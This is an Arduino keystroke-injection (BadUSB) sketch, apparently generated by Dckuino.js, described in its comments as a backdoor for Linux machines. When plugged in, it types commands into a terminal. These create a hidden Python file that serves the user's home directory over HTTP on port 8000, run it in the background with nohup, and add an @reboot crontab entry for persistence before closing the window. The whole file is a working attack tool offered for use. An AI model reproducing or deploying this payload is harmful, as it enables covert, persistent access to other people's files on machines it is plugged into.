/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Author:ControL
  // Version: 0.9
  // Description : Backdorring linux machine (at the time) over http://(+IP):(Port)
  // Description : The default port is 8000
  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();

  delay(1500);

  Keyboard.print("clear");

  delay(15);

  typeKey(KEY_RETURN);

  Keyboard.print("touch .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"import SimpleHTTPServer\" >> .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"import SocketServer\" >> .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"PORT = 8000\" >> .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"Handler = SimpleHTTPServer.SimpleHTTPRequestHandler\" >> .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"httpd = SocketServer.TCPServer(('', PORT), Handler)\" >> .profoles");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("echo \"httpd.serve_forever()\" >> .profoles");

  delay(100);

  typeKey(KEY_RETURN);

  Keyboard.print(" nohup python .profoles &");

  delay(20);

  typeKey(KEY_RETURN);

  Keyboard.print("crontab -e");

  delay(30);

  typeKey(KEY_RETURN);

  Keyboard.print("2");

  typeKey(KEY_RETURN);

  typeKey(KEY_LEFT_ARROW);

  Keyboard.print("#");

  delay(10);

  typeKey(KEY_RETURN);

  for(int i = 0; i < 40; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  Keyboard.print("@reboot ~/python .profoles &");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('x');
  Keyboard.releaseAll();

  delay(15);

  Keyboard.print("y");

  delay(10);

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}